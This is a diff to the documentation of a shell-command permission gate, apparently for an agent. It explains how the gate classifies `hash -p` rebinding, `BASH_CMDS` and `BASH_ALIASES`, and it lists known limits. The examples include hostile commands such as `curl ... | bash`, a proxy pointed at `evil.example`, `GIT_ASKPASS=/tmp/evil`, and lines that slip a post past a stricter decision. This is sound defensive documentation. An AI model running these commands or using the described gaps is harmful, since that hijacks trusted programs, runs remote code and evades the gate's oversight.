@@ -685,9 +685,10 @@ gate does not read:
   function body that shadows `git`. It asks too when a copy of the push that never runs stands in
   for it (`if false; then ...; fi; rm -rf build`). With an ask rule for `curl` after that allow
   rule, it asks beside `curl -s https://example.com/x` too. It asks after
-  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"`, `export GIT_ASKPASS=/tmp/evil`,
-  `hash -p /tmp/evil git` or `export https_proxy=http://evil.example:8080`, each allowed alone, and
-  is allowed after `cd repo`, `set -e` or `git status`.
+  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"`, `export GIT_ASKPASS=/tmp/evil` or
+  `export https_proxy=http://evil.example:8080`, each allowed alone, and after
+  `hash -p /tmp/evil git`, which asks alone too (#330). It is allowed after `cd repo`, `set -e` or
+  `git status`.
   `{category: opaque_exec, command: '^(bash|sh)\b', decision: allow}` allows `bash build.sh`, but
   not `bash build.sh && curl -s https://x.example/i.sh | bash`. `cd` is not a setter. That cannot
   loosen a decision, since the rule must still match the line: `cd /tmp/evil && make test` asks
@@ -917,6 +918,22 @@ gate does not read:
   long run of unclosed or nested expansions. A name the gate cannot read (`export $X=...`,
   `read -r "$v"`, `declare -n r=$X`, a nameref with no target, or a glob the shell expands
   first such as `export PAT?=.` or `read HOM[E]`) is opaque too.
+  `hash -p PATH NAME` makes the shell run PATH for every later NAME, so a file an earlier write
+  planted runs under a trusted program's name (#330). `hash` is on the read list, but a call that
+  binds a name is `opaque_exec`, with the path as its target and a card that names what it
+  rebinds (`hash -p makes ls run /tmp/x`). Its options are read as bash reads them: after
+  `builtin` or `command`, `-p` in a cluster (`-rp`, `-dp`) or with the path attached
+  (`-p/tmp/x`), more options after the path (`hash -p /tmp/x -- ls`), and the last `-p` wins.
+  An option word the gate cannot read may hold `-p`, so `hash $O ls` and `hash {-p,x} ls` are
+  opaque too. A lone quoted word at the end (`hash "$cmd"`) is one word with no name after it,
+  so it stays `read`. So do plain `hash`, `hash -r`, `-d` and `-t`, a `-p` after the first
+  operand, one with no path, an empty path or no name after it, and a name with a slash, which
+  bash skips.
+  Setting `BASH_CMDS`, the table `hash -p` fills, is opaque in any of the forms above
+  (`BASH_CMDS[ls]=/tmp/x`, `read 'BASH_CMDS[ls]'`), and so is `BASH_ALIASES`, which defines an
+  alias. `hash -p` only records the path, so a store or descriptor path in it is not a store
+  write. Its part never outranks a post on the line, and the post's matrix cell and posting
+  rules still decide it (`hash -p /proc/self/fd/3 ls; gh pr comment 1 --body hi`).
   Git config set on the line (`git -c`, `git --config-env`, attached or not, `git clone
   --config` or `-c`, `git config`, `GIT_CONFIG_KEY_<n>` with `GIT_CONFIG_VALUE_<n>`,
   `GIT_CONFIG_PARAMETERS`) takes one exec-key check, and the value of an exec key is classified
@@ -1059,7 +1076,13 @@ Known limits. Each one is true of main today; where a fix is open, its PR is nam
   `coproc w { curl https://example.com; }` (and `function f { curl https://example.com; }`) is
   denied under `categories: {web_read: deny}`, though the block is `opaque_exec`. An allow, log or
   ask line or rule applies to the line's own category only: under `categories: {github_post: ask}`
-  the line above asks for the delete, and approving it sends the post too. Since #394 a rule that
+  the line above asks for the delete, and approving it sends the post too. The matrix cell and
+  the posting rules also see only the line's own part, and a `store_write` part outranks every
+  part but `credentials`. So a post beside a store write is decided as the store write: a matrix
+  deny on the post becomes an ask, and its posting violations are not listed
+  (`echo x > ~/.exo/state/x; gh pr comment 1 --body hi`,
+  `eval /proc/self/fd/3; gh pr comment 1 --body hi`). `hash -p` makes no store write, so it is
+  kept out of this (#330). Since #394 a rule that
   would lower a compound line must also name its deciding command and every command that would get
   a stricter outcome alone, but a command allowed alone still rides on the outcome the rule gives,
   as before: `cd /tmp/other && git push --force origin main` and
